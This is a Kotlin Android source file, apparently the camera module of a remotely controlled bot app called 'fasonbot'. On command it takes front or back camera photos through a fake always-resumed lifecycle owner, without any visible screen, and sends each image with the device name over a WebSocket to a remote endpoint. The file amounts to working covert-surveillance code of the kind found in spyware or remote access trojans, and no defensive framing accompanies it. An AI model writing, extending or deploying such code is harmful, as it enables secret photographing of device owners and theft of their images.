package com.fasonbot.app.action

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.util.Log
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.core.ImageProxy
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import com.fasonbot.app.config.BotConfig
import com.fasonbot.app.service.CoreService
import com.fasonbot.app.ws.WebSocketSender
import com.google.common.util.concurrent.ListenableFuture
import java.nio.ByteBuffer
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.CountDownLatch
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

class CameraExecutor(context: Context) : BaseExecutor(context) {

    companion object {
        private const val TAG = "CameraExecutor"
        private const val IMAGE_QUALITY = 85
    }

    private val mainExecutor = ContextCompat.getMainExecutor(context)
    private val cameraExecutor: ExecutorService = Executors.newSingleThreadExecutor()
    private val sendExecutor: ExecutorService = Executors.newSingleThreadExecutor()

    private var provider: ProcessCameraProvider? = null
    private var imageCapture: ImageCapture? = null
    private val initialized = AtomicBoolean(false)
    private val capturing = AtomicBoolean(false)

    init { initialize() }

    private fun initialize() {
        cameraExecutor.execute {
            try {
                val future: ListenableFuture<ProcessCameraProvider> =
                    ProcessCameraProvider.getInstance(context)
                future.addListener({
                    try {
                        provider = future.get()
                        imageCapture = ImageCapture.Builder()
                            .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                            .setJpegQuality(IMAGE_QUALITY)
                            .setFlashMode(ImageCapture.FLASH_MODE_AUTO)
                            .build()
                        initialized.set(true)
                    } catch (e: Exception) {
                        Log.e(TAG, "Camera init failed: ${e.message}")
                    }
                }, mainExecutor)
            } catch (e: Exception) {
                Log.e(TAG, "Camera getInstance failed: ${e.message}")
            }
        }
    }

    private fun hasPermission(): Boolean =
        ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED

    fun capture(cameraId: Int) {
        if (!hasPermission()) {
            sendResponse("No camera permission")
            return
        }
        if (capturing.getAndSet(true)) return

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            CoreService.getInstance()?.updateServiceType(
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            )
        }

        cameraExecutor.execute {
            try {
                if (!ensureInitialized()) {
                    sendResponse("Camera initialization failed")
                    capturing.set(false)
                    return@execute
                }
                doCapture(cameraId)
            } catch (e: Exception) {
                sendResponse("Capture failed: ${e.message}")
                capturing.set(false)
            }
        }
    }

    private fun ensureInitialized(): Boolean {
        if (initialized.get() && provider != null) return true
        val latch = CountDownLatch(1)
        try {
            val future = ProcessCameraProvider.getInstance(context)
            future.addListener({
                try {
                    provider = future.get()
                    imageCapture = ImageCapture.Builder()
                        .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                        .setJpegQuality(IMAGE_QUALITY)
                        .build()
                    initialized.set(true)
                } catch (e: Exception) {
                    Log.e(TAG, "Ensure init failed: ${e.message}")
                }
                latch.countDown()
            }, mainExecutor)
        } catch (e: Exception) {
            latch.countDown()
        }
        try { latch.await(3, TimeUnit.SECONDS) } catch (_: Exception) {}
        return initialized.get() && provider != null
    }

    private fun doCapture(cameraId: Int) {
        val camProvider = provider ?: run { sendResponse("Camera not ready"); capturing.set(false); return }
        val capture = imageCapture ?: run { sendResponse("Capture not ready"); capturing.set(false); return }
        val isFront = cameraId == 1
        val selector = if (isFront) CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA

        try { selector.filter(camProvider.availableCameraInfos) } catch (e: Exception) {
            sendResponse(if (isFront) "No front camera" else "No back camera")
            capturing.set(false)
            return
        }

        mainExecutor.execute {
            try {
                camProvider.unbindAll()
                camProvider.bindToLifecycle(DummyLifecycleOwner.get(), selector, capture)
                cameraExecutor.execute {
                    try {
                        Thread.sleep(200)
                        mainExecutor.execute { takePicture(cameraId) }
                    } catch (e: Exception) { capturing.set(false) }
                }
            } catch (e: Exception) {
                sendResponse("Bind failed: ${e.message}")
                capturing.set(false)
            }
        }
    }

    private fun takePicture(cameraId: Int) {
        val capture = imageCapture ?: run { sendResponse("Capture not ready"); capturing.set(false); return }
        capture.takePicture(mainExecutor, object : ImageCapture.OnImageCapturedCallback() {
            override fun onCaptureSuccess(image: ImageProxy) {
                sendExecutor.execute {
                    try {
                        val buffer: ByteBuffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        sendImage(bytes, cameraId)
                    } catch (e: Exception) {
                        sendResponse("Image process failed: ${e.message}")
                    } finally {
                        mainExecutor.execute {
                            image.close()
                            capturing.set(false)
                        }
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                        CoreService.getInstance()?.releaseServiceType(
                            android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                        )
                    }
                }
            }

            override fun onError(e: ImageCaptureException) {
                sendResponse("Capture error: ${e.message}")
                capturing.set(false)
                initialized.set(false)
                cameraExecutor.execute { initialize() }
            }
        })
    }

    private fun sendImage(data: ByteArray, cameraId: Int) {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        val cameraName = if (cameraId == 1) "Front" else "Back"
        val fileName = "IMG_${timestamp}_${cameraName}.jpg"
        val caption = "📷 $cameraName Camera | ${BotConfig.getDeviceName()} | ${
            SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())
        }"
        WebSocketSender.sendPhoto(fileName, data, caption)
    }

    fun shutdown() {
        cameraExecutor.shutdown()
        sendExecutor.shutdown()
    }

    private class DummyLifecycleOwner private constructor() : LifecycleOwner {
        private val registry = LifecycleRegistry(this).apply { currentState = Lifecycle.State.RESUMED }
        override val lifecycle: Lifecycle get() = registry
        companion object {
            @Volatile private var instance: DummyLifecycleOwner? = null
            fun get() = instance ?: synchronized(this) { instance ?: DummyLifecycleOwner().also { instance = it } }
        }
    }
}
